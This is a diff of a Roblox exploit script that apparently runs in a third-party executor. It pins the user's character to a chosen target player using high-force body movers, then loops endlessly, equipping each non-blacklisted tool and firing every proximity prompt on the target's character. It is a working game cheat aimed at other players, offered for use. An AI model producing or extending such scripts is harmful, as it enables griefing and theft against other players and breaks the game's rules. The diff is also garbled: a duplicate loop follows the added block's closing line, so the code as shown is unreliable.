@@ -133,11 +133,13 @@ function activateScript()
     Instance.new("UICorner", F).CornerRadius = UDim.new(1, 0)
     TW:Create(F, TweenInfo.new(300, Enum.EasingStyle.Linear), {Size = UDim2.new(1, 0, 1, 0)}):Play()
 
-    task.spawn(function()
+        task.spawn(function()
         local HRP = (LP.Character or LP.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart")
         local Gy, Vel = Instance.new("BodyGyro", HRP), Instance.new("BodyVelocity", HRP)
         Gy.P, Gy.MaxTorque = 9e4, Vector3.new(9e9, 9e9, 9e9)
         Vel.MaxForce = Vector3.new(9e9, 9e9, 9e9)
+
+        local BLACKLIST = {"shovel", "sprinkler", "seed", "trowel", "rod", "staff"}
 
         R.RenderStepped:Connect(function()
             if Target and Target.Character and Target.Character:FindFirstChild("HumanoidRootPart") then
@@ -148,6 +150,36 @@ function activateScript()
             end
         end)
 
+        while task.wait(0.1) do
+            for _, tool in LP.Backpack:GetChildren() do
+                if tool:IsA("Tool") then
+                    local toolName = tool.Name:lower()
+                    local isBlacklisted = false
+                    for _, word in ipairs(BLACKLIST) do
+                        if toolName:find(word) then
+                            isBlacklisted = true
+                            break
+                        end
+                    end
+                    if not isBlacklisted then
+                        tool.Parent = LP.Character
+                        task.wait(0.075)
+                        if Target and Target.Character then
+                            for _, d in ipairs(Target.Character:GetDescendants()) do
+                                if d:IsA("ProximityPrompt") and d.Enabled then
+                                    pcall(function() fireproximityprompt(d) end)
+                                    task.wait(0.25) -- ⏱ Delay after firing prompt
+                                end
+                            end
+                        end
+                        task.wait(0.075)
+                        tool.Parent = LP.Backpack
+                        task.wait(0.075)
+                    end
+                end
+            end
+        end
+    end)
         while task.wait(0.1) do
             for _, tool in LP.Backpack:GetChildren() do
                 if tool:IsA("Tool") then
